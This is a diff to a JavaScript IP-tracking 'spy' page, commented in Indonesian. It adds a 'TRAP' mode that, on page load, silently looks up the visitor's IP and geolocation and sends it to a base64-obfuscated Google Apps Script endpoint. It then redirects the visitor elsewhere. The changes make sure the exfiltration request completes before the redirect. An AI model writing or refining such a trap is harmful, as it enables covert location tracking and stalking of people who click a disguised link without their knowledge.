@@ -7,7 +7,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const logsBody = document.getElementById('logs-body');
 
     // Obfuscated Cloud URL (Base64 of your Google Script URL)
-    const _0x4f2a = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6cUpiMEZ0ZVJxN1NVZkhxM0tJTVlvR1lEZktkbS1pMTJ2ME82YkhmWUQ5SHlQZmpkS0NSQjBUU19HNUd6RkJva3RnL2V4ZWM=';
+    const _0x4f2a = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6cUpiMEZ0ZVJxN1NVZkhxM0tJTVlvR1lEZktkbS1pMTJ2ME82YkhmWUQ5SHkyZmpkS0NSQjBUU19HNUd6RkJva3RnL2V4ZWM=';
     const getCUrl = () => atob(_0x4f2a);
 
     // 1. Utility: Loading
@@ -86,14 +86,20 @@ document.addEventListener('DOMContentLoaded', function () {
         localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
         localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));
 
-        // Simpan ke Cloud
-        try {
-            await fetch(cloudUrl, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(logEntry)
-            });
-        } catch (e) { console.error("Cloud Save Failed"); }
+        // Simpan ke Cloud (WAJIB AWAIT agar tidak terputus saat redirect)
+        if (cloudUrl && cloudUrl.startsWith('http')) {
+            try {
+                await fetch(cloudUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(logEntry),
+                    headers: { 'Content-Type': 'text/plain' }
+                });
+                console.log("Cloud sync initiated");
+                // Beri jeda sedikit agar request benar-benar keluar
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (e) { console.error("Cloud Save Failed", e); }
+        }
     }
 
     // 5. Fetch Logs
@@ -162,7 +168,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-link w-100 text-center mt-3 py-2">BUKA PETA</a>
                 </div>`;
             
-            saveLog(data, targetIp ? 'Search' : 'Self');
+            await saveLog(data, targetIp ? 'MANUAL' : 'LIVE');
         } catch (e) { 
             showLoading(false); 
             resultArea.innerHTML = `<div class="alert alert-danger">${e.message}</div>`;
@@ -206,7 +212,12 @@ document.addEventListener('DOMContentLoaded', function () {
         
         // Silent Tracking with fallback
         fetchIpIntel('')
-            .then(data => saveLog(data, 'TRAP', redirTarget))
-            .finally(() => window.location.href = redirTarget);
+            .then(async (data) => {
+                await saveLog(data, 'TRAP', redirTarget);
+                window.location.href = redirTarget;
+            })
+            .catch(() => {
+                window.location.href = redirTarget;
+            });
     }
 });
